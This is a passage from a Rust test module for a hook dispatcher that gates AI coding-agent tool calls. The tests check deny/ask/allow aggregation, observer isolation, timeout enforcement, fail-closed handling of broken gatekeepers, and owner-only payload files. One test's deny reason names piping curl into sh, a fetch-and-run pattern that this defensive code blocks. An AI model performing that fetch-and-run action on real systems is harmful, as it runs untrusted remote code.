                ),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert_eq!(response.decision, Decision::Deny);
        assert_eq!(
            response.updated_input, None,
            "a denied call must carry no rewrite: {response:?}"
        );
        assert_eq!(response.reason.as_deref(), Some("piping curl into sh"));
    }

    /// An `observer`'s verdict cannot change the outcome, all the way through
    /// `compose` — not only through `aggregate`.
    ///
    /// The aggregate-level test below pins the pure function; this one pins that
    /// `compose` actually routes observer responses through it, which is where a
    /// tier that changes nothing would acquire the ability to deny.
    #[test]
    #[cfg(unix)]
    fn an_observer_cannot_deny_through_compose() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", r#"{"decision":"deny","reason":"I am only a logger"}"#),
            dir.path(),
        )];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        // It ran (so this is not vacuous) and its verdict was discarded.
        envelope_seen_by(dir.path(), "o1");
        assert_eq!(
            response.decision,
            Decision::None,
            "an observer's verdict must be ignored: {response:?}"
        );
    }

    /// Every failure a payload can produce degrades to
    /// [`CanonicalResponse::no_opinion`] — never to a `deny` assembled by
    /// accident on a failure path (I3).
    #[test]
    #[cfg(unix)]
    fn an_unusable_answer_and_a_failed_spawn_both_degrade_to_no_opinion() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [
            dispatch_entry(
                "garbage",
                HookTier::Gatekeeper,
                recording_payload(dir.path(), "garbage", "this is not JSON"),
                dir.path(),
            ),
            dispatch_entry(
                "missing",
                HookTier::Gatekeeper,
                HookHandler::Argv(vec!["grim-hook-payload-that-does-not-exist".to_string()]),
                dir.path(),
            ),
        ];
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);
        assert_eq!(response, CanonicalResponse::no_opinion(), "{response:?}");
    }

    /// A payload that outlives its timeout is killed, and the elapsed time is
    /// what proves it.
    ///
    /// Without the elapsed assertion this test passes vacuously against a
    /// `compose` that simply waits for the 5-second sleep and then reads empty
    /// output — the degrade value would be identical.
    #[test]
    #[cfg(unix)]
    fn a_payload_that_outlives_its_timeout_is_killed_and_degrades() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut slow = dispatch_entry(
            "slow",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["sh".to_string(), "-c".to_string(), "sleep 5".to_string()]),
            dir.path(),
        );
        slow.timeout = Some(1);
        let rows = [slow];

        let started = std::time::Instant::now();
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);
        let elapsed = started.elapsed();

        assert_eq!(response, CanonicalResponse::no_opinion(), "{response:?}");
        assert!(
            elapsed < std::time::Duration::from_secs(4),
            "the declared 1s timeout was not enforced — compose waited {elapsed:?}"
        );
    }

    /// **Security review W3.** Hooks run serially, each up to its own timeout,
    /// yet the client kills `grim-hook` at the timeout ONE registration
    /// carries. Two slow gatekeepers with a 2s timeout each must therefore be
    /// cut off by one invocation-wide deadline strictly below 2s, not run for 4s.
    #[test]
    #[cfg(unix)]
    fn the_whole_invocation_ends_before_the_registered_client_timeout() {
        let dir = tempfile::tempdir().expect("tempdir");
        let slow = |id: &str| {
            let mut entry = dispatch_entry(
                id,
                HookTier::Gatekeeper,
                HookHandler::Argv(vec!["sh".to_string(), "-c".to_string(), "sleep 5".to_string()]),
                dir.path(),
            );
            entry.timeout = Some(2);
            entry
        };
        let rows = [slow("first"), slow("second")];

        let started = std::time::Instant::now();
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);
        let elapsed = started.elapsed();

        assert_eq!(response, CanonicalResponse::no_opinion(), "{response:?}");
        assert!(
            elapsed < std::time::Duration::from_secs(2),
            "the invocation outlived the 2s client timeout — compose waited {elapsed:?}"
        );
    }

    /// An observer's short timeout must not cut the verdict budget: here it
    /// would leave 0.5s, and the gatekeeper needs 0.8s to answer.
    #[test]
    #[cfg(unix)]
    fn a_short_observer_timeout_does_not_starve_a_gatekeeper() {
        let dir = tempfile::tempdir().expect("tempdir");
        let gatekeeper = dispatch_entry(
            "g1",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec![
                "sh".to_string(),
                "-c".to_string(),
                r#"sleep 0.8; printf '%s' '{"decision":"deny","reason":"slow but sure"}'"#.to_string(),
            ]),
            dir.path(),
        );
        let mut observer = dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", "{}"),
            dir.path(),
        );
        observer.timeout = Some(1);
        let rows = [gatekeeper, observer];

        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert_eq!(response.decision, Decision::Deny, "{response:?}");
    }

    /// An observer on its own matcher gets its own 1s client registration, and
    /// that registration's invocation still runs the match-all gatekeeper. The
    /// whole run must end inside 1s, or Copilot kills grim and fails closed.
    #[test]
    #[cfg(unix)]
    fn a_separately_registered_observer_still_bounds_the_invocation() {
        let dir = tempfile::tempdir().expect("tempdir");
        let gatekeeper = dispatch_entry(
            "g1",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["sh".to_string(), "-c".to_string(), "sleep 3".to_string()]),
            dir.path(),
        );
        let mut observer = dispatch_entry(
            "o1",
            HookTier::Observer,
            recording_payload(dir.path(), "o1", "{}"),
            dir.path(),
        );
        observer.matcher = Some("Bash".to_string());
        observer.timeout = Some(1);
        let rows = [gatekeeper, observer];

        let started = std::time::Instant::now();
        compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);
        let elapsed = started.elapsed();

        assert!(
            elapsed < std::time::Duration::from_secs(1),
            "outlived the observer registration's 1s client timeout: {elapsed:?}"
        );
    }

    /// A timeout too large for `Instant` arithmetic, as a hand-edited table can
    /// carry, must not panic the dispatcher and silence every hook at the event.
    #[test]
    #[cfg(unix)]
    fn an_absurd_table_timeout_does_not_panic_the_invocation() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut gatekeeper = dispatch_entry(
            "g1",
            HookTier::Gatekeeper,
            recording_payload(dir.path(), "g1", r#"{"decision":"deny","reason":"still here"}"#),
            dir.path(),
        );
        gatekeeper.timeout = Some(u64::MAX);
        let rows = [gatekeeper];

        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert_eq!(response.decision, Decision::Deny, "{response:?}");
    }

    /// **Security review S3.** The shell form runs `/bin/sh`, never a `sh`
    /// resolved through the inherited `$PATH`.
    #[test]
    #[cfg(unix)]
    fn the_shell_form_runs_bin_sh_by_absolute_path() {
        let command = handler_command(&HookHandler::Command("true".to_string()), Path::new("/tmp/payload"));
        assert_eq!(command.get_program(), "/bin/sh");
    }

    /// **Security review S2.** The envelope file can carry a tool call's input,
    /// so it is created owner-only.
    #[test]
    #[cfg(unix)]
    fn the_payload_envelope_file_is_owner_only() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().expect("tempdir");
        let row = entry("file", HookTier::Observer);
        let file = write_payload_file(Some(dir.path()), &row, b"{}", &mut Vec::new()).expect("written");
        let path = file.path();
        let mode = std::fs::metadata(path).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "envelope mode {mode:o}");
        assert_eq!(std::fs::read(path).unwrap(), b"{}");
    }

    /// Payload envelope files left in `dir`.
    #[cfg(unix)]
    fn envelope_files(dir: &Path) -> Vec<String> {
        std::fs::read_dir(dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .filter(|name| name.starts_with("payload_"))
            .collect()
    }

    /// A stale envelope from a crashed run with the same pid must be stepped over,
    /// never overwritten and never fatal: exit 74 on every call made Copilot deny
    /// every tool use.
    #[test]
    #[cfg(unix)]
    fn a_stale_envelope_file_is_skipped_not_fatal_or_overwritten() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pid = std::process::id();
        for slot in 0..3 {
            std::fs::write(dir.path().join(envelope_file_name(pid, slot)), b"stale").unwrap();
        }
        let slots = std::sync::atomic::AtomicU64::new(0);

        let file = create_payload_file(dir.path(), b"fresh", &slots).expect("a free slot is found");

        assert_eq!(file.path(), dir.path().join(envelope_file_name(pid, 3)));
        assert_eq!(std::fs::read(file.path()).unwrap(), b"fresh");
        for slot in 0..3 {
            let stale = dir.path().join(envelope_file_name(pid, slot));
            assert_eq!(std::fs::read(stale).unwrap(), b"stale");
        }
    }

    /// The slot search is bounded: a directory full of stale names fails rather than spinning.
    #[test]
    #[cfg(unix)]
    fn the_slot_search_is_bounded() {
        let dir = tempfile::tempdir().expect("tempdir");
        let pid = std::process::id();
        for slot in 0..u64::from(MAX_SLOT_ATTEMPTS) {
            std::fs::write(dir.path().join(envelope_file_name(pid, slot)), b"stale").unwrap();
        }
        let slots = std::sync::atomic::AtomicU64::new(0);

        let err = create_payload_file(dir.path(), b"x", &slots).expect_err("no slot is free");

        assert_eq!(err.kind(), std::io::ErrorKind::AlreadyExists);
    }

    /// The envelope can hold tool input, so a spawn that fails must not leave it behind.
    #[test]
    #[cfg(unix)]
    fn a_failed_handler_spawn_removes_the_envelope_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut row = dispatch_entry(
            "gone",
            HookTier::Observer,
            HookHandler::Argv(vec!["/nonexistent/grim-test-handler".into()]),
            dir.path(),
        );
        row.payload = HookPayloadMode::File;
        let rows = [row];

        super::compose(
            &plan_over(&rows),
            &invocation(&audit_at(dir.path())),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );

        assert_eq!(envelope_files(dir.path()), Vec::<String>::new());
    }

    /// A reader or writer thread grim cannot start is grim's failure: a gatekeeper
    /// is withheld (non-zero exit) rather than forged into "no opinion", the child
    /// is killed so the call returns at once, and the envelope file is removed.
    /// An observer stays fail-open.
    #[test]
    #[cfg(unix)]
    fn a_writer_thread_spawn_failure_withholds_a_gatekeeper_and_cleans_up() {
        thread_spawn_failure_withholds(0);
    }

    #[test]
    #[cfg(unix)]
    fn a_reader_thread_spawn_failure_withholds_a_gatekeeper_and_cleans_up() {
        thread_spawn_failure_withholds(1);
    }

    #[cfg(unix)]
    fn thread_spawn_failure_withholds(failing_spawn: usize) {
        let dir = tempfile::tempdir().expect("tempdir");
        let slow = HookHandler::Argv(vec!["sleep".into(), "30".into()]);
        let mut gatekeeper = dispatch_entry("g1", HookTier::Gatekeeper, slow.clone(), dir.path());
        gatekeeper.payload = HookPayloadMode::File;
        let observer = dispatch_entry("o1", HookTier::Observer, slow, dir.path());

        FAIL_THREAD_SPAWN.with(|f| f.set(Some(failing_spawn)));
        let started = Instant::now();
        let withheld = super::compose(
            &plan_over(&[gatekeeper]),
            &invocation(&audit_at(dir.path())),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        FAIL_THREAD_SPAWN.with(|f| f.set(Some(failing_spawn)));
        let observed = super::compose(
            &plan_over(&[observer]),
            &invocation(&audit_at(dir.path())),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        FAIL_THREAD_SPAWN.with(|f| f.set(None));

        assert_eq!(withheld.withheld, Some(WithheldCause::ThreadSpawn));
        assert_eq!(withheld.response, CanonicalResponse::no_opinion());
        assert_eq!(observed.withheld, None);
        assert!(started.elapsed() < Duration::from_secs(10), "the child was not killed");
        assert_eq!(envelope_files(dir.path()), Vec::<String>::new());
    }

    /// A gatekeeper that crashes, times out, answers with garbage or cannot be
    /// spawned gave no usable verdict, so it is withheld like a grim-owned failure.
    #[test]
    #[cfg(unix)]
    fn a_gatekeeper_payload_failure_is_withheld() {
        let dir = tempfile::tempdir().expect("tempdir");
        let cases: [(&str, DispatchEntry); 4] = [
            ("crash", sh_gatekeeper(dir.path(), "g", "exit 3", 5)),
            ("garbage", sh_gatekeeper(dir.path(), "g", "echo not-json", 5)),
            ("timeout", sh_gatekeeper(dir.path(), "g", "sleep 5", 1)),
            (
                "spawn",
                dispatch_entry(
                    "g",
                    HookTier::Gatekeeper,
                    HookHandler::Argv(vec!["/nonexistent/grim-test-handler".into()]),
                    dir.path(),
                ),
            ),
        ];
        for (name, row) in cases {
            let composed = super::compose(
                &plan_over(&[row]),
                &invocation(&audit_at(dir.path())),
                PRE_TOOL_USE_RAW,
                &mut Vec::new(),
            );
            assert_eq!(composed.withheld, Some(WithheldCause::PayloadFailed), "{name}");
            assert_eq!(composed.response, CanonicalResponse::no_opinion(), "{name}");
        }
    }

    /// Only a gatekeeper is withheld: the same failures in an observer or a mutator
    /// stay fail-open.
    #[test]
    #[cfg(unix)]
    fn an_observer_or_mutator_payload_failure_stays_fail_open() {
        let dir = tempfile::tempdir().expect("tempdir");
        for tier in [HookTier::Observer, HookTier::Mutator] {
            for script in ["exit 3", "echo not-json"] {
                let mut row = sh_gatekeeper(dir.path(), "h", script, 5);
                row.tier = tier;
                let composed = super::compose(
                    &plan_over(&[row]),
                    &invocation(&audit_at(dir.path())),
                    PRE_TOOL_USE_RAW,
                    &mut Vec::new(),
                );
                assert_eq!(composed.withheld, None, "{tier:?} {script}");
            }
        }
    }

    /// A clean exit with nothing to say stays "no opinion", and a usable answer
    /// is honoured even when the process then exits non-zero.
    #[test]
    #[cfg(unix)]
    fn a_silent_success_and_an_answered_failure_are_not_withheld() {
        let dir = tempfile::tempdir().expect("tempdir");
        let silent = sh_gatekeeper(dir.path(), "g", "exit 0", 5);
        let composed = super::compose(
            &plan_over(&[silent]),
            &invocation(&audit_at(dir.path())),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, None);

        let answered = sh_gatekeeper(
            dir.path(),
            "g",
            r#"printf '{"decision":"deny","reason":"no"}'; exit 3"#,
            5,
        );
        let composed = super::compose(
            &plan_over(&[answered]),
            &invocation(&audit_at(dir.path())),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, None);
        assert_eq!(composed.response.decision, Decision::Deny);
    }

    fn outcome(tier: HookTier, decision: Decision) -> HookOutcome {
        HookOutcome {
            hook: "guard/x".to_string(),
            tier,
            response: CanonicalResponse {
                decision,
                ..CanonicalResponse::no_opinion()
            },
            withheld: None,
        }
    }

    /// Decision O part 1: mutators are a separate phase, in declaration order.
    #[test]
    fn order_keeps_declaration_order_within_each_tier_o1() {
        let rows = [
            entry("m1", HookTier::Mutator),
            entry("g1", HookTier::Gatekeeper),
            entry("m2", HookTier::Mutator),
            entry("o1", HookTier::Observer),
        ];
        let borrowed: Vec<&DispatchEntry> = rows.iter().collect();
        let plan = order(&borrowed);
        assert_eq!(
            plan.mutators.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(),
            ["m1", "m2"],
            "mutators must keep declaration order — the chain's meaning depends on it"
        );
        assert_eq!(
            plan.gatekeepers.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(),
            ["g1"]
        );
        assert_eq!(plan.observers.iter().map(|e| e.id.as_str()).collect::<Vec<_>>(), ["o1"]);
    }

    /// Decision O part 3: `deny` is absorbing.
    #[test]
    fn deny_absorbs_every_other_verdict_o3() {
        let outcomes = [
            outcome(HookTier::Gatekeeper, Decision::Allow),
            outcome(HookTier::Gatekeeper, Decision::Deny),
            outcome(HookTier::Gatekeeper, Decision::Ask),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Deny);
    }

    /// Decision O part 4: `ask` outranks `allow`.
    #[test]
    fn ask_outranks_allow_o4() {
        let outcomes = [
            outcome(HookTier::Gatekeeper, Decision::Allow),
            outcome(HookTier::Gatekeeper, Decision::Ask),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Ask);
    }

    /// An `observer` cannot influence the verdict — a tier that changes
    /// nothing must not be able to change this one.
    #[test]
    fn an_observer_verdict_is_ignored() {
        let outcomes = [
            outcome(HookTier::Observer, Decision::Deny),
            outcome(HookTier::Gatekeeper, Decision::Allow),
        ];
        assert_eq!(aggregate(&outcomes), Decision::Allow);
        assert_eq!(aggregate(&[]), Decision::None, "an empty set has no opinion");
    }

    /// ⛔ **S4/M6.** The unlogged-mutator outcome is a claim about a rewrite that
    /// existed.
    ///
    /// Pins the narrowing that round 3 found untested: widening it back to an
    /// unconditional assignment reports a suppressed mutation for a mutator that
    /// never rewrote anything, in the one record a reader consults to answer
    /// exactly that question.
    #[test]
    fn only_a_mutator_that_actually_rewrote_reports_a_discarded_rewrite() {
        assert_eq!(unlogged_mutator_outcome(true), AuditOutcome::RewriteDiscardedUnlogged);
        assert_eq!(
            unlogged_mutator_outcome(false),
            AuditOutcome::Completed,
            "a mutator that rewrote nothing must not leave a discarded-rewrite record behind"
        );
    }
    #[cfg(unix)]
    fn sh_gatekeeper(dir: &Path, id: &str, script: &str, timeout: u64) -> DispatchEntry {
        let mut row = dispatch_entry(
            id,
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["sh".to_string(), "-c".to_string(), script.to_string()]),
            dir,
        );
        row.timeout = Some(timeout);
        row
    }

    /// An answer past [`MAX_RESPONSE_BYTES`] is cut, so what the parser sees is a
    /// truncated document and the hook degrades; an uncapped read would parse the
    /// whole `deny`.
    #[test]
    #[cfg(unix)]
    fn an_answer_past_the_response_cap_is_truncated_and_degrades() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [sh_gatekeeper(
            dir.path(),
            "big",
            r#"printf '{"decision":"deny","reason":"'; head -c 200000 /dev/zero | tr '\0' x; printf '"}'"#,
            5,
        )];

        let started = std::time::Instant::now();
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert_eq!(response, CanonicalResponse::no_opinion(), "{:?}", response.decision);
        assert!(started.elapsed() < std::time::Duration::from_secs(4));
    }

    /// A handler's stderr is not inherited: it is the client's terminal channel.
    #[test]
    #[cfg(target_os = "linux")]
    fn a_handler_stderr_is_dev_null() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [sh_gatekeeper(
            dir.path(),
            "err",
            &format!("readlink /proc/self/fd/2 > '{}/stderr-target'", dir.path().display()),
            5,
        )];
        compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        let target = std::fs::read_to_string(dir.path().join("stderr-target")).expect("handler ran");
        assert_eq!(target.trim(), "/dev/null");
    }

    /// A background grandchild inherits the stdout pipe and holds it open past the
    /// handler's own exit; the deadline, not EOF, must end the wait.
    #[test]
    #[cfg(unix)]
    fn a_grandchild_holding_the_pipe_does_not_hold_the_invocation() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [sh_gatekeeper(
            dir.path(),
            "gc",
            &format!("touch '{}/ran'; sleep 5 & echo x", dir.path().display()),
            1,
        )];

        let started = std::time::Instant::now();
        let response = compose(&plan_over(&rows), &invocation(&audit_at(dir.path())), PRE_TOOL_USE_RAW);

        assert!(dir.path().join("ran").exists(), "the handler never ran");
        assert_eq!(response, CanonicalResponse::no_opinion());
        assert!(
            started.elapsed() < std::time::Duration::from_secs(3),
            "the grandchild's pipe held the invocation for {:?}",
            started.elapsed()
        );
    }

    fn withheld_outcome(tier: HookTier, decision: Decision, withheld: Option<WithheldCause>) -> HookOutcome {
        HookOutcome {
            withheld,
            ..outcome(tier, decision)
        }
    }

    /// **PD-6.** A composed `deny` wins over a withheld gatekeeper; otherwise the
    /// first withheld gatekeeper's cause is reported; other tiers carry none.
    #[test]
    fn a_composed_deny_beats_a_withheld_gatekeeper_pd6() {
        let withheld = Some(WithheldCause::PayloadFileWrite);
        let deny = withheld_outcome(HookTier::Gatekeeper, Decision::Deny, None);
        let gone = withheld_outcome(HookTier::Gatekeeper, Decision::None, withheld);
        assert_eq!(withheld_cause(&[gone.clone(), deny]), None);
        assert_eq!(withheld_cause(&[gone]), withheld);
        let allow = withheld_outcome(HookTier::Gatekeeper, Decision::Allow, None);
        let gone = withheld_outcome(
            HookTier::Gatekeeper,
            Decision::None,
            Some(WithheldCause::AuditUnwritable),
        );
        assert_eq!(withheld_cause(&[allow, gone]), Some(WithheldCause::AuditUnwritable));
        assert_eq!(withheld_cause(&[outcome(HookTier::Gatekeeper, Decision::Allow)]), None);
    }

    /// A composed `ask` is shielded like a `deny`: Claude treats the error exit as
    /// non-blocking, so withholding would turn the prompt into a silent proceed.
    #[test]
    fn a_composed_ask_beats_a_withheld_gatekeeper() {
        let ask = withheld_outcome(HookTier::Gatekeeper, Decision::Ask, None);
        let gone = withheld_outcome(HookTier::Gatekeeper, Decision::None, Some(WithheldCause::PayloadFailed));
        assert_eq!(withheld_cause(&[gone.clone(), ask]), None);
        assert_eq!(withheld_cause(&[gone]), Some(WithheldCause::PayloadFailed));
    }

    /// Only a gatekeeper's withholding is a cause: an observer behind an
    /// unwritable trail is withheld too, but exits 0 as before.
    #[test]
    #[cfg(unix)]
    fn an_unwritable_trail_withholds_only_a_gatekeeper_cause() {
        let dir = tempfile::tempdir().expect("tempdir");
        // A directory where the trail file should be: it can never be appended to.
        std::fs::create_dir(dir.path().join("hook_audit.jsonl")).unwrap();
        let audit = audit_at(dir.path());

        let rows = [dispatch_entry(
            "o1",
            HookTier::Observer,
            HookHandler::Argv(vec!["true".into()]),
            dir.path(),
        )];
        let composed = super::compose(
            &plan_over(&rows),
            &invocation(&audit),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, None);

        let rows = [dispatch_entry(
            "g1",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["true".into()]),
            dir.path(),
        )];
        let composed = super::compose(
            &plan_over(&rows),
            &invocation(&audit),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, Some(WithheldCause::AuditUnwritable));
    }

    /// A non-object raw payload cannot be enveloped.
    #[test]
    #[cfg(unix)]
    fn a_non_object_payload_withholds_with_envelope_build() {
        let dir = tempfile::tempdir().expect("tempdir");
        let rows = [dispatch_entry(
            "g1",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["true".into()]),
            dir.path(),
        )];
        let composed = super::compose(
            &plan_over(&rows),
            &invocation(&audit_at(dir.path())),
            b"[1]",
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, Some(WithheldCause::EnvelopeBuild));
        assert_eq!(composed.response, CanonicalResponse::no_opinion());
    }

    /// End to end: a `payload = "file"` gatekeeper whose file cannot be written is
    /// withheld, and a sibling gatekeeper's composed `deny` still wins.
    #[test]
    #[cfg(unix)]
    fn a_failed_payload_file_is_withheld_unless_a_sibling_denies_pd6() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().expect("tempdir");
        let trail_dir = dir.path().join("trail");
        std::fs::create_dir(&trail_dir).unwrap();
        std::fs::write(trail_dir.join("hook_audit.jsonl"), b"").unwrap();
        std::fs::set_permissions(&trail_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
        if std::fs::File::create(trail_dir.join("probe")).is_ok() {
            // Root ignores the mode; the failure cannot be provoked.
            return;
        }
        let audit = audit_at(&trail_dir);

        let mut filed = dispatch_entry(
            "f1",
            HookTier::Gatekeeper,
            HookHandler::Argv(vec!["true".into()]),
            dir.path(),
        );
        filed.payload = HookPayloadMode::File;
        let rows = [filed.clone()];
        let composed = super::compose(
            &plan_over(&rows),
            &invocation(&audit),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.withheld, Some(WithheldCause::PayloadFileWrite));

        let denier = dispatch_entry(
            "d1",
            HookTier::Gatekeeper,
            recording_payload(dir.path(), "d1", r#"{"decision":"deny","reason":"no"}"#),
            dir.path(),
        );
        let rows = [filed, denier];
        let composed = super::compose(
            &plan_over(&rows),
            &invocation(&audit),
            PRE_TOOL_USE_RAW,
            &mut Vec::new(),
        );
        assert_eq!(composed.response.decision, Decision::Deny);
        assert_eq!(composed.withheld, None);
        std::fs::set_permissions(&trail_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
}
